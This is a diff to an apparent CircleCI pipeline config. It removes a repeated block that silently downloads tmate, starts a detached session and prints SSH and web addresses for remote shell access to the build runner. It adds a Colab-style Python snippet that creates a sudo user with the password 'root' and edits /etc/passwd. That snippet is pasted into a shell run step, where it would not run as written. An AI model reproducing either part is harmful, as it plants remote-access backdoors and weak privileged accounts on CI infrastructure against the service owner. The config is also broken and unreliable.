@@ -8,15 +8,23 @@ jobs:
           password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
     steps:
       - checkout
-      - run: wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
-wget -nc https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-tar --skip-old-files -xvf tmate-2.4.0-static-linux-i386.tar.xz &> /dev/null
-rm -f nohup.out; bash -ic 'nohup ./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock new-session -d & disown -a' >/dev/null 2>&1
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock wait tmate-ready
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with SSH address: #{tmate_ssh}"
-./tmate-2.4.0-static-linux-i386/tmate -S /tmp/tmate.sock display -p "Connect with web: #{tmate_web}"
+      - run: import os
+ 
+username = "user" #@param {type:"string"}
+password = "root" #@param {type:"string"}
+ 
+print("Creating User and Setting it up")
+ 
+# Creation of user
+os.system(f"useradd -m {username}")
+ 
+# Add user to sudo group
+os.system(f"adduser {username} sudo")
+    
+# Set password of user to 'root'
+os.system(f"echo '{username}:{password}' | sudo chpasswd")
+ 
+# Change default shell from sh to bash
+os.system("sed -i 's/\/bin\/sh/\/bin\/bash/g' /etc/passwd")
+ 
+print("User Created and Configured")
